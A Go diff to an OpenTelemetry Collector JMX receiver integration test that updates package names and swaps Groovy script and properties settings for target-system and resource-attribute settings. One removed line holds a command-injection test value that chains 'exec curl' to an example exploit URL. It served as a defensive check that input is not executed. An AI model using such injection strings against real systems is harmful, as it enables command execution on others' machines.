@@ -24,7 +24,7 @@ import (
 	"io/ioutil"
 	"net/http"
 	"os"
-	"path"
+	"path/filepath"
 	"testing"
 	"time"
 
@@ -35,7 +35,7 @@ import (
 	"go.opentelemetry.io/collector/component/componenttest"
 	"go.opentelemetry.io/collector/consumer/consumertest"
 	"go.opentelemetry.io/collector/exporter/exporterhelper"
-	"go.opentelemetry.io/collector/model/pdata"
+	"go.opentelemetry.io/collector/pdata/pmetric"
 	"go.uber.org/zap"
 	"go.uber.org/zap/zaptest/observer"
 )
@@ -90,7 +90,7 @@ func cassandraContainer(t *testing.T) testcontainers.Container {
 	ctx := context.Background()
 	req := testcontainers.ContainerRequest{
 		FromDockerfile: testcontainers.FromDockerfile{
-			Context:    path.Join(".", "testdata"),
+			Context:    filepath.Join("testdata"),
 			Dockerfile: "Dockerfile.cassandra",
 		},
 		ExposedPorts: []string{"7199:7199"},
@@ -157,7 +157,7 @@ func (suite *JMXIntegrationSuite) TestJMXReceiverHappyPath() {
 				CollectionInterval: 100 * time.Millisecond,
 				Endpoint:           fmt.Sprintf("%v:7199", hostname),
 				JARPath:            jar,
-				GroovyScript:       path.Join(".", "testdata", "script.groovy"),
+				TargetSystem:       "cassandra",
 				OTLPExporterConfig: otlpExporterConfig{
 					Endpoint: "127.0.0.1:0",
 					TimeoutSettings: exporterhelper.TimeoutSettings{
@@ -166,15 +166,11 @@ func (suite *JMXIntegrationSuite) TestJMXReceiverHappyPath() {
 				},
 				Password: "cassandra",
 				Username: "cassandra",
-				Properties: map[string]string{
-					// should be used by Autoconfigure to set resource attributes
-					"otel.resource.attributes": "myattr=myvalue,myotherattr=myothervalue",
-					// test script sets dp labels from these system property values
-					"my.label.name": "mylabel", "my.label.value": "myvalue",
-					"my.other.label.name": "myotherlabel", "my.other.label.value": "myothervalue",
-					// confirmation that arbitrary content isn't executed by subprocess
-					"one": "two & exec curl http://example.com/exploit && exit 123",
+				ResourceAttributes: map[string]string{
+					"myattr":      "myvalue",
+					"myotherattr": "myothervalue",
 				},
+				LogLevel: "debug",
 			}
 			require.NoError(t, cfg.validate())
 
@@ -221,9 +217,9 @@ func (suite *JMXIntegrationSuite) TestJMXReceiverHappyPath() {
 				require.True(t, ok)
 				require.Equal(t, "myothervalue", anotherCustomAttr.StringVal())
 
-				ilm := rm.InstrumentationLibraryMetrics().At(0)
-				require.Equal(t, "io.opentelemetry.contrib.jmxmetrics", ilm.InstrumentationLibrary().Name())
-				require.Equal(t, "1.0.0-alpha", ilm.InstrumentationLibrary().Version())
+				ilm := rm.ScopeMetrics().At(0)
+				require.Equal(t, "io.opentelemetry.contrib.jmxmetrics", ilm.Scope().Name())
+				require.Equal(t, "1.0.0-alpha", ilm.Scope().Version())
 
 				met := ilm.Metrics().At(0)
 
@@ -232,19 +228,9 @@ func (suite *JMXIntegrationSuite) TestJMXReceiverHappyPath() {
 				require.Equal(t, "By", met.Unit())
 
 				// otel-java only uses int sum w/ non-monotonic for up down counters instead of gauge
-				require.Equal(t, pdata.MetricDataTypeSum, met.DataType())
+				require.Equal(t, pmetric.MetricDataTypeSum, met.DataType())
 				sum := met.Sum()
 				require.False(t, sum.IsMonotonic())
-
-				// These labels are determined by system properties
-				labels := sum.DataPoints().At(0).Attributes()
-				customLabel, ok := labels.Get("mylabel")
-				require.True(t, ok)
-				require.Equal(t, "myvalue", customLabel.StringVal())
-
-				anotherCustomLabel, ok := labels.Get("myotherlabel")
-				require.True(t, ok)
-				require.Equal(t, "myothervalue", anotherCustomLabel.StringVal())
 
 				return true
 			}, 30*time.Second, 100*time.Millisecond, getJavaStdout(receiver))
@@ -258,8 +244,7 @@ func TestJMXReceiverInvalidOTLPEndpointIntegration(t *testing.T) {
 		CollectionInterval: 100 * time.Millisecond,
 		Endpoint:           fmt.Sprintf("service:jmx:rmi:///jndi/rmi://localhost:7199/jmxrmi"),
 		JARPath:            "/notavalidpath",
-		Properties:         make(map[string]string),
-		GroovyScript:       path.Join(".", "testdata", "script.groovy"),
+		TargetSystem:       "jvm",
 		OTLPExporterConfig: otlpExporterConfig{
 			Endpoint: "<invalid>:123",
 			TimeoutSettings: exporterhelper.TimeoutSettings{
